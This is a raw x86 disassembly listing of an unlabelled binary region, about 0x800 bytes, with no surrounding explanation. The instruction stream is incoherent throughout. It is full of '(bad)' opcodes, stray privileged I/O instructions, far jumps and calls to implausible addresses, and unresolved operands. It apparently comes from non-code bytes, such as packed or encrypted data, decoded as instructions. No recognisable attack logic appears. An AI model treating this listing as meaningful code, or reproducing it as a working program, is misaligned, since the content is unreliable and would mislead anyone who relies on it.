  40967b:	fimul  WORD PTR [esi+0x7d9b1c58]
  409681:	dec    ebp
  409682:	sti    
  409683:	es inc ebx
  409685:	call   0xc11a8c14
  40968a:	jne    0x40963d
  40968c:	dec    eax
  40968d:	push   ds
  40968e:	fisub  WORD PTR ds:0x44700747
  409694:	mov    edx,0xe6e50eeb
  409699:	cld    
  40969a:	jle    0x4096e7
  40969c:	outs   dx,DWORD PTR ds:[esi]
  40969d:	retf   
  40969e:	pop    esp
  40969f:	shl    dl,0x35
  4096a2:	popa   
  4096a3:	push   ebx
  4096a4:	imul   eax,DWORD PTR [edi],0x33b79093
  4096aa:	and    DWORD PTR [esi+ebx*8-0x76650894],esi
  4096b1:	loopne 0x40969c
  4096b3:	jmp    0x8c4d5ba9
  4096b8:	mov    bl,0x21
  4096ba:	nop
  4096bb:	mov    bl,0x1e
  4096be:	sbb    DWORD PTR [ebx],ebp
  4096c0:	jae    0x4096b8
  4096c2:	mov    ss,WORD PTR [ebx-0x76808423]
  4096c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096c9:	dec    eax
  4096ca:	jecxz  0x4096e2
  4096cc:	xchg   ebp,eax
  4096cd:	aad    0xef
  4096cf:	test   DWORD PTR [esi+0x437cdb50],0xd0060bed
  4096d9:	std    
  4096da:	push   edx
  4096db:	mov    cs,WORD PTR [eax+0x1366cd00]
  4096e1:	sub    DWORD PTR [ecx],eax
  4096e3:	pop    esp
  4096e4:	add    DWORD PTR [ecx+0x51cbfe96],0x2c
  4096eb:	aaa    
  4096ec:	or     al,0x19
  4096ee:	icebp  
  4096ef:	pop    ecx
  4096f0:	dec    ebx
  4096f1:	call   0xe7c4:0x71d43ec6
  4096f8:	test   BYTE PTR [edx+0x47b9131],cl
  4096fe:	adc    al,0xc2
  409700:	cmp    DWORD PTR [ebp+0x8],edi
  409703:	int    0xac
  409705:	jnp    0x409703
  409707:	jmp    0x6a40:0xf8393dda
  40970e:	mov    dl,0xf
  409710:	cmp    ebx,ecx
  409712:	test   al,0xf9
  409714:	sahf   
  409715:	out    0xe8,eax
  409717:	outs   dx,DWORD PTR ds:[esi]
  409718:	(bad)  
  409719:	mov    DWORD PTR [edi+0x24bf0242],ecx
  40971f:	ss cmp eax,0x6019f660
  409725:	addr16 jno 0x409795
  409728:	ffree  st(0)
  40972a:	add    dh,dh
  40972c:	(bad)  
  40972d:	adc    al,0x10
  40972f:	fwait
  409730:	out    dx,eax
  409731:	shr    eax,0xdf
  409734:	xchg   ebx,eax
  409735:	mov    al,ds:0x9ceebfe8
  40973a:	jnp    0x40972d
  40973c:	shl    bl,1
  40973e:	icebp  
  40973f:	and    al,0x93
  409741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409742:	or     DWORD PTR [edi],0x29f5e417
  409748:	jp     0x409702
  40974a:	iret   
  40974b:	outs   dx,DWORD PTR ds:[esi]
  40974c:	scas   eax,DWORD PTR es:[edi]
  40974d:	test   eax,0x9972d6ac
  409752:	stos   BYTE PTR es:[edi],al
  409753:	ficomp WORD PTR gs:[ebx-0x78b48e67]
  40975a:	xor    DWORD PTR [esi+0x5e],ebx
  40975d:	jb     0x4096f3
  40975f:	pop    edi
  409760:	inc    eax
  409761:	test   DWORD PTR [esi+0x772f5bbf],ebp
  409767:	mov    edx,0x3040fa0a
  40976c:	test   al,0x9d
  40976e:	jne    0x409707
  409770:	jecxz  0x4097ce
  409772:	cmp    BYTE PTR [ebx+0x65],al
  409775:	xchg   esp,eax
  409776:	cmc    
  409777:	mov    dl,0x57
  409779:	loop   0x4096fe
  40977b:	add    esi,0x3efe7ce8
  409781:	mov    dh,0x9d
  409783:	xor    al,0x5
  409785:	nop
  409786:	(bad)  
  409788:	les    ebx,FWORD PTR [eax+ecx*2]
  40978b:	imul   ebp,DWORD PTR [edx+0x2],0x3e696bae
  409792:	and    cl,ch
  409794:	sbb    al,BYTE PTR [ebx+0x3a]
  409797:	dec    edx
  409798:	rol    eax,0x55
  40979b:	pop    esp
  40979c:	(bad)  
  40979d:	xchg   edx,eax
  40979e:	repnz rol DWORD PTR [edi+0x1c325e1b],1
  4097a5:	mov    edi,0xcb8a43c8
  4097aa:	ja     0x409812
  4097ac:	inc    esp
  4097ad:	xchg   ah,dh
  4097af:	ds gs (bad) 
  4097b2:	pop    ds
  4097b3:	cmp    edx,ebx
  4097b5:	out    0xc8,al
  4097b7:	push   0x98171773
  4097bc:	test   BYTE PTR [edx*1-0x4a711b65],bh
  4097c3:	sub    dh,cl
  4097c5:	jge    0x409749
  4097c7:	xor    al,0x9c
  4097c9:	retf   
  4097ca:	push   0x726e11f9
  4097cf:	mov    esp,DWORD PTR [esi+0xa]
  4097d2:	ret    0xcf58
  4097d5:	adc    eax,0xe50df127
  4097da:	sbb    eax,0xc8dce8ca
  4097df:	and    edx,0xe844dd41
  4097e5:	jns    0x409787
  4097e7:	cmp    eax,0xacafef86
  4097ec:	pop    ebp
  4097ed:	pusha  
  4097ee:	lahf   
  4097ef:	bound  ebx,QWORD PTR [ebx-0x5894e8b8]
  4097f5:	sub    BYTE PTR [ebx+ecx*4-0x3],bh
  4097f9:	mov    al,ds:0xa1bc26f4
  4097fe:	std    
  4097ff:	inc    ebp
  409800:	dec    esp
  409801:	cwde   
  409802:	or     eax,0x1a6506d0
  409807:	(bad)  
  409808:	xchg   ebp,eax
  409809:	jecxz  0x4097e8
  40980b:	xchg   esp,eax
  40980d:	or     al,0x75
  40980f:	mov    esi,0x3871b0f8
  409814:	bnd gs jne 0x4097ff
  409818:	mov    ah,0xf5
  40981a:	mov    ss,WORD PTR [ebx+ebx*2]
  40981d:	push   ebx
  40981e:	iret   
  40981f:	repnz arpl ax,sp
  409822:	cdq    
  409823:	ret    0x7f5b
  409826:	sar    DWORD PTR [ecx-0x21],0xca
  40982a:	or     DWORD PTR [ecx+0x46],esi
  40982d:	cmovns ebp,DWORD PTR [ecx-0x2e]
  409831:	gs adc al,0xd7
  409834:	stc    
  409835:	and    DWORD PTR [esi-0x29],eax
  409838:	in     al,0xf0
  40983a:	je     0x4097d8
  40983c:	push   ebx
  40983d:	not    DWORD PTR [ecx-0x3a]
  409840:	fldcw  WORD PTR [edi]
  409842:	pop    ds
  409843:	popf   
  409844:	or     dl,0x24
  409847:	retf   0xf8bb
  40984a:	xchg   esi,eax
  40984b:	ss pushf 
  40984d:	dec    eax
  40984e:	ins    BYTE PTR es:[edi],dx
  40984f:	fnstenv [ebx+edx*8-0xe839cf9]
  409856:	add    esp,DWORD PTR ds:0xf03cfa1b
  40985c:	loop   0x40988a
  40985e:	fadd   QWORD PTR [esi+0x758fcf9e]
  409864:	pop    ebp
  409865:	(bad)  
  409866:	js     0x4098d8
  409868:	cdq    
  409869:	mov    bh,0x22
  40986b:	fisttp DWORD PTR [eax-0x10b848c]
  409871:	test   DWORD PTR [ecx-0x4d],ebp
  409874:	mov    ds:0x88d922c9,eax
  409879:	mov    gs,WORD PTR [edi]
  40987b:	jmp    0xe64a1e4e
  409880:	test   BYTE PTR [ebx-0x1ad5008],0x96
  409887:	pushf  
  409888:	dec    ecx
  409889:	pop    ecx
  40988a:	mov    bl,0x72
  40988c:	xor    eax,0xa970ebd9
  409891:	cmp    eax,0xad17773e
  409896:	mov    bh,0x9e
  409898:	pop    eax
  409899:	test   DWORD PTR [edi+0x7a],ecx
  40989c:	lock into 
  40989e:	and    eax,0xe1f4cfe1
  4098a3:	pop    ebx
  4098a4:	jno    0x40991c
  4098a6:	xor    ebx,DWORD PTR [eax+0x5ef804e6]
  4098ac:	cmp    DWORD PTR [eax+0x10964afb],eax
  4098b2:	sub    bh,dl
  4098b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098b5:	shr    DWORD PTR [edi-0x1b],0x81
  4098b9:	int    0xc0
  4098bb:	pop    ds
  4098bc:	xor    eax,0x7f75a690
  4098c1:	pop    eax
  4098c2:	in     al,0xb5
  4098c4:	cmp    al,0xce
  4098c6:	jg     0x40992d
  4098c8:	adc    BYTE PTR [esi],dl
  4098ca:	ret    0x2913
  4098cd:	pushf  
  4098ce:	sbb    dh,ah
  4098d0:	xchg   edi,eax
  4098d1:	pop    ss
  4098d2:	jg     0x40986d
  4098d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098d5:	pop    edx
  4098d6:	out    dx,al
  4098d7:	rol    dh,1
  4098d9:	sub    ebx,esi
  4098db:	sar    BYTE PTR [ecx],1
  4098dd:	add    cl,dh
  4098df:	mov    ds:0xc4ff5029,eax
  4098e4:	adc    BYTE PTR [ecx+0xf],bl
  4098e7:	sub    DWORD PTR [eax-0x35],eax
  4098ea:	loope  0x4098c6
  4098ec:	mov    al,ds:0xea288887
  4098f1:	add    DWORD PTR [esi+0x2],0xce9feec1
  4098f8:	sbb    DWORD PTR [ebp+ebp*4-0x3],0x4bc88fad
  409900:	scas   eax,DWORD PTR es:[edi]
  409901:	shl    DWORD PTR [edx],cl
  409903:	std    
  409904:	test   al,0x71
  409906:	push   ebp
  409907:	xor    BYTE PTR [edi],bh
  409909:	add    DWORD PTR [edi],ecx
  40990b:	xor    bh,BYTE PTR [eax+edi*8-0x4cc70a35]
  409912:	push   es
  409913:	sub    eax,0xe68a29e
  409918:	loop   0x409936
  40991a:	push   edi
  40991b:	mov    esp,0x7d6b6690
  409920:	xchg   esp,eax
  409921:	mov    ah,0xe9
  409923:	cmp    bh,BYTE PTR [ebx+0x4e]
  409926:	shl    DWORD PTR [ecx],0x89
  409929:	scas   eax,DWORD PTR es:[edi]
  40992a:	inc    ebp
  40992b:	les    esp,FWORD PTR [ecx-0x2f8bb327]
  409931:	and    al,0x0
  409933:	(bad)  
  409934:	sahf   
  409935:	bound  edx,QWORD PTR [edx]
  409937:	ins    BYTE PTR es:[edi],dx
  409938:	xchg   ebx,eax
  409939:	stos   BYTE PTR es:[edi],al
  40993a:	push   si
  40993c:	stos   DWORD PTR es:[edi],eax
  40993d:	fild   QWORD PTR [ecx+0x1a7ff886]
  409943:	pop    ecx
  409944:	mov    dh,0x23
  409946:	sub    dh,ch
  409948:	in     al,0xb4
  40994a:	stos   DWORD PTR es:[edi],eax
  40994b:	push   0xffffffc5
  40994d:	dec    ebp
  40994e:	outs   dx,BYTE PTR ds:[esi]
  40994f:	push   edx
  409950:	add    al,0x58
  409952:	stos   DWORD PTR es:[edi],eax
  409953:	out    0xc7,al
  409955:	xchg   esp,eax
  409956:	sub    ah,BYTE PTR [ebx-0x7a11d512]
  40995c:	(bad)  
  40995d:	dec    ebx
  40995e:	aad    0xeb
  409960:	mov    edi,DWORD PTR [ebx-0x61]
  409963:	xor    al,0x2a
  409965:	and    eax,0x4e738759
  40996a:	not    BYTE PTR ds:0x7fd78608
  409970:	sbb    al,0x43
  409972:	fs push 0xdaead498
  409978:	ret    0x8c17
  40997b:	popf   
  40997c:	xchg   ecx,eax
  40997d:	pusha  
  40997e:	pop    eax
  40997f:	enter  0xe0ac,0x4f
  409983:	idiv   ebp
  409985:	xchg   ebx,eax
  409986:	bound  esp,QWORD PTR [eax+0x15bffc37]
  40998c:	and    BYTE PTR [edi+0x58],dl
  40998f:	jae    0x409931
  409991:	jge    0x409992
  409993:	bound  edx,QWORD PTR [eax]
  409995:	xor    bl,ch
  409997:	push   ss
  409998:	jl     0x409948
  40999a:	xlat   BYTE PTR ds:[ebx]
  40999b:	inc    ebx
  40999c:	out    dx,al
  40999d:	cmp    eax,ebp
  40999f:	or     eax,0xbd3dce1e
  4099a4:	adc    esi,DWORD PTR [eax-0x5d]
  4099a7:	aam    0x68
  4099a9:	inc    ebp
  4099aa:	adc    ecx,edi
  4099ac:	jle    0x40996a
  4099ae:	test   BYTE PTR [ecx+edi*2+0x5a95ebc7],dl
  4099b5:	mov    dl,0x60
  4099b7:	scas   al,BYTE PTR es:[edi]
  4099b8:	mov    edx,?
  4099ba:	mov    esp,0x1adf2f4
  4099bf:	jns    0x409a12
  4099c1:	pop    ebx
  4099c2:	js     0x40997e
  4099c4:	add    ebx,DWORD PTR [ecx+ecx*2-0x3a1bba64]
  4099cb:	(bad)  
  4099cc:	in     eax,dx
  4099cd:	mov    al,ds:0x4e0026
  4099d2:	xchg   ecx,eax
  4099d3:	popf   
  4099d4:	ins    DWORD PTR es:[di],dx
  4099d6:	mov    ds:0x704aec94,al
  4099db:	jno    0x4099ea
  4099dd:	jae    0x409964
  4099df:	out    0x26,eax
  4099e1:	(bad)  
  4099e2:	shl    al,1
  4099e4:	aaa    
  4099e5:	inc    edi
  4099e6:	aas    
  4099e7:	out    dx,eax
  4099e8:	aad    0xac
  4099ea:	cmp    bl,ah
  4099ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ed:	(bad)  
  4099ee:	sti    
  4099ef:	pusha  
  4099f0:	fldcw  WORD PTR [ecx+0x0]
  4099f3:	enter  0xe25e,0x12
  4099f7:	pushf  
  4099f8:	cmp    eax,0x2a82f219
  4099fd:	bnd call 0x1711508
  409a03:	jle    0x409a45
  409a05:	mov    cl,0x76
  409a07:	push   esp
  409a08:	sub    ecx,esp
  409a0a:	call   FWORD PTR [edx]
  409a0c:	push   ss
  409a0d:	or     dl,bh
  409a0f:	sbb    edi,ebx
  409a11:	js     0x409a3f
  409a13:	pop    eax
  409a14:	pop    edi
  409a15:	ret    
  409a16:	(bad)  [ecx+0x6f]
  409a19:	mov    DWORD PTR [esi],esi
  409a1b:	(bad)  
  409a1c:	enter  0x2879,0x95
  409a20:	sbb    edx,ebp
  409a22:	mov    bh,0x9b
  409a24:	mov    ds:0x422a68d0,al
  409a29:	mov    esi,0x98c325df
  409a2e:	stos   DWORD PTR es:[edi],eax
  409a2f:	sbb    esp,esi
  409a31:	inc    ebx
  409a32:	sbb    DWORD PTR [edi],0x6e
  409a35:	pop    esi
  409a36:	mov    WORD PTR [ecx+0xab8ada4],ds
  409a3c:	leave  
  409a3d:	aaa    
  409a3e:	jmp    0xc7ad:0x865c9d58
  409a45:	pop    ecx
  409a46:	hlt    
  409a47:	mov    bl,0xfb
  409a49:	jle    0x409a61
  409a4b:	retf   0x5f78
  409a4e:	pop    ecx
  409a4f:	jb     0x409abf
  409a51:	into   
  409a52:	sbb    BYTE PTR [esi+edi*1+0xb2a7879],dh
  409a59:	(bad)  
  409a5a:	lock sub bl,bh
  409a5d:	sbb    edx,0xe
  409a60:	inc    edx
  409a61:	call   0xe1b7aca6
  409a66:	mov    DWORD PTR [edi-0x5c],ebp
  409a69:	scas   al,BYTE PTR es:[edi]
  409a6a:	jmp    0x218a:0xb224be93
  409a71:	stc    
  409a72:	ja     0x409aae
  409a74:	fisttp QWORD PTR [eax]
  409a76:	push   eax
  409a77:	cld    
  409a78:	inc    esi
  409a79:	sub    BYTE PTR [esi],al
  409a7b:	xor    eax,0x3793e0de
  409a80:	scas   al,BYTE PTR es:[edi]
  409a81:	dec    di
  409a83:	jle    0x409b02
  409a85:	dec    edi
  409a86:	daa    
  409a87:	mov    ds:0xb8861aec,al
  409a8c:	and    BYTE PTR [ecx-0x28],ch
  409a8f:	addr16 out 0xae,al
  409a92:	and    al,BYTE PTR [edx+0x2a]
  409a95:	in     eax,0x53
  409a97:	jb     0x409a3c
  409a99:	sub    edi,DWORD PTR [esi+0x41]
  409a9c:	xor    dh,al
  409a9e:	inc    ecx
  409a9f:	sub    eax,0x14b916b5
  409aa4:	dec    ebp
  409aa5:	mov    ds:0x76d1a730,al
  409aaa:	pop    es
  409aab:	push   es
  409aac:	sbb    eax,0xbed5bc00
  409ab1:	sti    
  409ab2:	mov    ecx,0xb84235f5
  409ab7:	inc    ebx
  409ab8:	sbb    DWORD PTR ds:0x1e6284a,0x2f
  409abf:	stos   DWORD PTR es:[edi],eax
  409ac0:	dec    ecx
  409ac1:	(bad)  [edi]
  409ac3:	push   es
  409ac4:	mov    bh,0x80
  409ac6:	mov    eax,0xe9246611
  409acb:	and    al,0xb1
  409acd:	pusha  
  409ace:	or     al,BYTE PTR [edx+0x65]
  409ad1:	jae    0x409b05
  409ad3:	es xor al,0x69
  409ad6:	add    ch,BYTE PTR [esi-0x23]
  409ad9:	loop   0x409ac7
  409adb:	add    DWORD PTR [esi+0x2d],ecx
  409ade:	cmp    edx,DWORD PTR [edx-0x34086f74]
  409ae4:	mov    bl,0x87
  409ae6:	outs   dx,DWORD PTR ds:[esi]
  409ae7:	cmp    al,0x66
  409ae9:	adc    al,0x7
  409aeb:	and    eax,0x78c74989
  409af0:	out    0xb7,al
  409af2:	clc    
  409af3:	je     0x409ac1
  409af5:	data16 jle 0x409b17
  409af8:	ins    BYTE PTR es:[edi],dx
  409af9:	pop    ds
  409afa:	bsr    esp,DWORD PTR [ebx-0x10022c7d]
  409b01:	xlat   BYTE PTR ds:[ebx]
  409b02:	pop    esp
  409b03:	test   BYTE PTR [ebp-0xee8ef41],bl
  409b09:	(bad)
  409b0d:	and    BYTE PTR [edi-0x4c],0xc8
  409b11:	addr16 loope 0x409b45
  409b14:	cmp    eax,0x1403ee23
  409b19:	mov    esi,0x8ebae8c7
  409b1e:	xor    DWORD PTR [edx+0x2732ed85],0xa25d78d6
  409b28:	cmp    ebx,DWORD PTR [ebx+ecx*2-0x54d368ff]
  409b2f:	retf   0x94c9
  409b32:	or     eax,0x7ba9da62
  409b37:	addr16 ret 
  409b39:	retf   
  409b3a:	jmp    0xb7cd:0xffa2952
  409b41:	mov    ecx,0x2adb84b1
  409b46:	jl     0x409bac
  409b48:	(bad)  
  409b49:	pushf  
  409b4a:	(bad)
  409b4f:	adc    eax,0xdc8c8e42
  409b54:	dec    esi
  409b55:	fidiv  DWORD PTR [edi-0x43]
  409b58:	dec    ebx
  409b59:	mov    ebp,0x6e9ff26b
  409b5e:	fisttp WORD PTR [ebp+0x64]
  409b61:	int    0xce
  409b63:	push   edi
  409b64:	jne    0x409b18
  409b66:	cs out 0xd1,al
  409b69:	and    al,BYTE PTR [edi-0x5c]
  409b6c:	loopne 0x409b95
  409b6e:	dec    edi
  409b6f:	mov    esi,0x5210ed06
  409b74:	sbb    DWORD PTR [edx+0x323926f2],edx
  409b7a:	mov    esi,0xad6f67a8
  409b7f:	out    0x22,al
  409b81:	ins    BYTE PTR es:[edi],dx
  409b82:	dec    edi
  409b83:	mov    DWORD PTR [eax+0x62],eax
  409b86:	mov    esp,0x9679d0e9
  409b8b:	popf   
  409b8c:	mov    ecx,0x40f05300
  409b91:	in     eax,dx
  409b92:	aaa    
  409b93:	mov    ds:0x8516321f,eax
  409b98:	(bad)  
  409b99:	xor    edx,DWORD PTR [edx+0x2d]
  409b9c:	sbb    cl,BYTE PTR [eax]
  409b9e:	dec    ecx
  409b9f:	and    ch,dl
  409ba1:	or     DWORD PTR [edx+0x1e5edc0d],0xffffffe3
  409ba8:	ds cdq 
  409baa:	xor    DWORD PTR [ebx+edi*8-0x49],0x62
  409baf:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  409bb1:	xor    BYTE PTR [eax-0xf],ch
  409bb4:	nop
  409bb5:	(bad)  
  409bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb7:	(bad)  
  409bb8:	shr    DWORD PTR [ecx],1
  409bba:	inc    ebp
  409bbb:	(bad)
  409bbe:	mov    eax,ds:0x7a74c627
  409bc3:	fwait
  409bc4:	mov    ch,0x81
  409bc6:	(bad)  
  409bc7:	out    0xc5,eax
  409bc9:	adc    BYTE PTR [eax],ch
  409bcb:	xor    BYTE PTR [ebx-0x6e1d526],dl
  409bd1:	pop    edi
  409bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bd3:	xor    DWORD PTR [edx-0x37cd1042],edi
  409bd9:	mov    edi,0xf6bf8fd4
  409bde:	lock pop es
  409be0:	cmp    bl,BYTE PTR [ebx-0x614bd97e]
  409be6:	pop    esi
  409be7:	xchg   ebp,eax
  409be8:	lods   eax,DWORD PTR ds:[esi]
  409be9:	int    0x94
  409beb:	ja     0x409bb8
  409bed:	and    ebp,DWORD PTR [eax+0x1e]
  409bf0:	jmp    DWORD PTR [esi+eax*2+0x7d]
  409bf4:	pop    ds
  409bf5:	mov    ch,0xda
  409bf7:	popa   
  409bf8:	retf   
  409bf9:	(bad)  
  409bfa:	cmp    eax,0x9f26e65e
  409bff:	popa   
  409c00:	test   eax,0xa5773803
  409c05:	sbb    dl,ah
  409c07:	(bad)  
  409c08:	scas   eax,DWORD PTR es:[edi]
  409c09:	or     al,0xf1
  409c0b:	fnop   
  409c0d:	mov    dl,0xd0
  409c0f:	sub    al,0x3d
  409c11:	jmp    0x7d5:0x965ce987
  409c18:	adc    DWORD PTR [ecx+ebp*4+0x70],edi
  409c1c:	ret    0x361d
  409c1f:	push   es
  409c20:	rcl    DWORD PTR [ebx-0x31b0b937],cl
  409c26:	mov    eax,0xa62116ba
  409c2b:	ins    DWORD PTR es:[edi],dx
  409c2c:	jmp    0x409c90
  409c2e:	pop    ebx
  409c2f:	in     al,dx
  409c30:	xchg   esi,eax
  409c31:	in     eax,0xfd
  409c33:	out    0x1d,eax
  409c35:	cmp    DWORD PTR [esp+eiz*8-0x4e],edx
  409c39:	jecxz  0x409c83
  409c3b:	dec    esp
  409c3c:	sbb    DWORD PTR [edx],edi
  409c3e:	sti    
  409c3f:	ss inc edi
  409c41:	dec    esi
  409c42:	shr    ch,cl
  409c44:	cmc    
  409c45:	fstp   DWORD PTR [ebx-0x128b58d0]
  409c4b:	xor    dl,dh
  409c4d:	mov    fs,ecx
  409c4f:	fs pop ebp
  409c51:	in     eax,dx
  409c52:	rol    DWORD PTR [ebp-0x6f933b7e],1
  409c58:	retf   
  409c59:	shr    bl,cl
  409c5b:	push   0x48
  409c5d:	adc    al,0xc0
  409c5f:	cmp    dl,BYTE PTR [ecx]
  409c61:	fld    TBYTE PTR [eax]
  409c63:	pop    ss
  409c64:	push   ds
  409c65:	xor    BYTE PTR [edi-0x1b],dl
  409c68:	dec    ebx
  409c69:	or     eax,0x65a66d86
  409c6e:	adc    DWORD PTR [ecx+0x7b0c773f],esp
  409c74:	jp     0x409cec
  409c76:	(bad)  
  409c77:	hlt    
  409c78:	or     esi,DWORD PTR [edi+0x35]
  409c7b:	sbb    al,0x13
  409c7d:	xor    esp,esi
  409c7f:	or     eax,0x815dbbf
  409c84:	cmp    al,0xd6
  409c86:	push   0xffffffea
  409c88:	(bad)  
  409c8b:	push   ecx
  409c8c:	(bad)  
  409c8d:	repnz iret 
  409c8f:	lock or DWORD PTR [ebp-0x3c5c76d],edx
  409c96:	cdq    
  409c97:	push   0x46
  409c99:	cmp    DWORD PTR [eax],esi
  409c9b:	mov    cl,0x92
  409c9d:	loop   0x409c60
  409c9f:	sbb    al,0xaa
  409ca1:	pop    ecx
  409ca2:	pop    ecx
  409ca3:	stos   DWORD PTR es:[edi],eax
  409ca4:	cli    
  409ca5:	inc    edx
  409ca6:	push   ecx
  409ca7:	sti    
  409ca8:	jnp    0x409c54
  409caa:	inc    ebp
  409cab:	int3   
  409cac:	pop    eax
  409cad:	fidivr DWORD PTR [eax+ecx*1+0x21fd352d]
  409cb4:	(bad)  
  409cb5:	std    
  409cb6:	das    
  409cb7:	add    DWORD PTR [ecx],esi
  409cb9:	pushf  
  409cba:	adc    ebp,edi
  409cbc:	(bad)  
  409cbd:	push   ecx
  409cbe:	mov    ah,0x10
  409cc0:	std    
  409cc1:	dec    edx
  409cc2:	test   al,0x31
  409cc4:	mov    BYTE PTR [esi+0x4c6259cd],bl
  409cca:	aad    0x9c
  409ccc:	std    
  409ccd:	jo     0x409d04
  409ccf:	cmc    
  409cd0:	iret   
  409cd1:	jns    0x409d22
  409cd3:	ja     0x19727678
  409cd9:	dec    edi
  409cda:	mov    ebx,0xa314bb20
  409cdf:	fstp   QWORD PTR [eax+0x3a7a4231]
  409ce5:	leave  
  409ce6:	in     eax,dx
  409ce7:	pop    esi
  409ce8:	and    eax,0x6229e55b
  409ced:	loopne 0x409cfa
  409cef:	lods   al,BYTE PTR ds:[esi]
  409cf0:	jns    0x409d70
  409cf2:	mov    dl,0x51
  409cf4:	fcmovnb st,st(2)
  409cf6:	mov    ?,edi
  409cf8:	lods   al,BYTE PTR ds:[esi]
  409cf9:	iret   
  409cfa:	push   0x735835f0
  409cff:	mov    edi,0x203e9e92
  409d04:	(bad)
  409d07:	fcmovnb st,st(7)
  409d09:	outs   dx,WORD PTR ds:[esi]
  409d0b:	cmp    DWORD PTR [edi+ecx*2+0x3a616f57],ebp
  409d12:	aam    0x75
  409d14:	nop
  409d15:	out    0x5d,al
  409d17:	ficom  DWORD PTR [eax+0x76d3ac2e]
  409d1d:	(bad)  
  409d1e:	repnz mov ebp,esi
  409d21:	sub    eax,0xaf0286a7
  409d26:	inc    ebx
  409d27:	pop    esp
  409d28:	xchg   eax,edi
  409d2a:	jmp    0x409cfc
  409d2c:	cmp    al,0x10
  409d2e:	xor    al,0x58
  409d30:	les    edx,FWORD PTR [edi+0x6c]
  409d33:	add    esp,0x16
  409d36:	jo     0x409d79
  409d38:	inc    ecx
  409d39:	jmp    0x409d2c
  409d3b:	add    ebp,DWORD PTR [ebp+edi*8+0x1e5dd23a]
  409d42:	sar    DWORD PTR [ebx-0x58],cl
  409d45:	repz imul edx,edi,0x34
  409d49:	pop    edx
  409d4a:	mov    eax,0xb4a18fc
  409d4f:	mov    dl,0x8
  409d52:	ins    DWORD PTR es:[edi],dx
  409d53:	inc    edx
  409d54:	adc    BYTE PTR [esi+0x27],ch
  409d57:	iret   
  409d58:	xchg   edi,eax
  409d59:	int    0x2d
  409d5b:	stos   DWORD PTR es:[edi],eax
  409d5c:	aaa    
  409d5d:	retf   0xd750
  409d60:	inc    edi
  409d61:	mov    dh,0x63
  409d63:	mov    DWORD PTR [ecx+0x38487f58],esp
  409d69:	or     BYTE PTR [esi],ch
  409d6b:	scas   eax,DWORD PTR es:[edi]
  409d6c:	add    ebx,edi
  409d6e:	enter  0x1e46,0xaa
  409d72:	hlt    
  409d73:	or     bh,BYTE PTR [edx+0x1a]
  409d76:	scas   al,BYTE PTR es:[edi]
  409d77:	fcomip st,st(6)
  409d79:	and    eax,0x52558cbc
  409d7e:	daa    
  409d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d80:	cmp    BYTE PTR [edx],cl
  409d82:	push   edx
  409d83:	push   ebp
  409d84:	mov    ebx,0x1b2a6971
  409d89:	imul   BYTE PTR [ecx+0x5b]
  409d8c:	(bad)  
  409d8d:	in     eax,dx
  409d8e:	inc    edx
  409d8f:	cmp    al,0x33
  409d91:	adc    BYTE PTR [esi],dl
  409d93:	xchg   esp,eax
  409d94:	fcom   DWORD PTR [bp+si+0x18]
  409d98:	mov    ebx,0x4837b15e
  409d9d:	std    
  409d9e:	sub    eax,0xbda76439
  409da3:	xchg   ecx,eax
  409da4:	inc    ebp
  409da5:	adc    BYTE PTR ds:0x6adaa767,al
  409dab:	enter  0x8039,0xa2
  409daf:	(bad)  
  409db0:	mov    esp,0xcba9a8ea
  409db5:	push   edi
  409db6:	les    ecx,FWORD PTR [ebp+0x1c]
  409db9:	ror    DWORD PTR [eax],cl
  409dbb:	(bad)  
  409dbc:	mov    bh,0x35
  409dbe:	lahf   
  409dbf:	mov    bl,bl
  409dc1:	adc    al,0x1c
  409dc3:	jae    0x409e3f
  409dc5:	es call 0x225d9322
  409dcb:	mov    cl,BYTE PTR [edx-0x63]
  409dce:	and    BYTE PTR [edi],cl
  409dd0:	sub    al,0x3d
  409dd2:	xchg   ebx,eax
  409dd3:	pop    esi
  409dd4:	and    cl,dl
  409dd6:	xor    eax,0xd21a0607
  409ddb:	fwait
  409ddc:	js     0x409d5e
  409dde:	retf   
  409ddf:	and    eax,0x17876d38
  409de4:	int3   
  409de5:	lods   al,BYTE PTR ds:[esi]
  409de6:	push   ds
  409de7:	jle    0x409d80
  409de9:	enter  0xeb66,0xde
  409ded:	fsub   QWORD PTR [ebp+0x1134e87c]
  409df3:	xchg   esp,eax
  409df4:	jae    0x409e48
  409df6:	mov    DWORD PTR es:[edx+0x42],edi
  409dfa:	add    eax,0x8fcd9308
  409dff:	fidivr DWORD PTR [ecx+edx*4+0x4b]
  409e03:	jns    0x409da2
  409e05:	aas    
  409e06:	mov    esi,0xdb054dae
  409e0b:	lods   eax,DWORD PTR ds:[esi]
  409e0c:	mov    ch,0xbf
  409e0e:	sbb    ch,BYTE PTR [esi]
  409e10:	stc    
  409e11:	std    
  409e12:	(bad)  
  409e13:	fs out 0x3c,eax
  409e16:	cmp    dl,dl
  409e18:	aaa    
  409e19:	xchg   ebx,ebx
  409e1b:	outs   dx,DWORD PTR gs:[esi]
  409e1d:	mov    ebp,0xcba18861
  409e22:	stc    
  409e23:	cmp    ebp,esp
  409e25:	add    ebx,DWORD PTR [eax+0x26]
  409e28:	rcr    DWORD PTR [edx],cl
  409e2a:	pop    eax
  409e2b:	mov    dh,0x12
  409e2d:	repnz retf 
  409e2f:	add    dl,BYTE PTR [edi-0x79]
  409e32:	es push ss
  409e34:	inc    ebp
  409e35:	lods   al,BYTE PTR ds:[esi]
  409e36:	cmp    esi,edx
  409e38:	sar    bl,0xb4
  409e3b:	dec    edi
  409e3c:	fisub  WORD PTR [ecx]
  409e3e:	or     ebx,DWORD PTR [ebp+0x7c5c1674]
  409e44:	retf   0x7c99
  409e47:	shl    edi,1
  409e49:	std    
  409e4a:	push   edx
  409e4b:	inc    edi
  409e4c:	test   DWORD PTR [edx+0x17],0xe3e36b3b
  409e53:	push   esi
  409e54:	mov    ds:0x94f5bff8,al
  409e59:	dec    edx
  409e5a:	xchg   ecx,eax
  409e5b:	shl    DWORD PTR [esi-0x3b],0xb1
  409e5f:	dec    esp
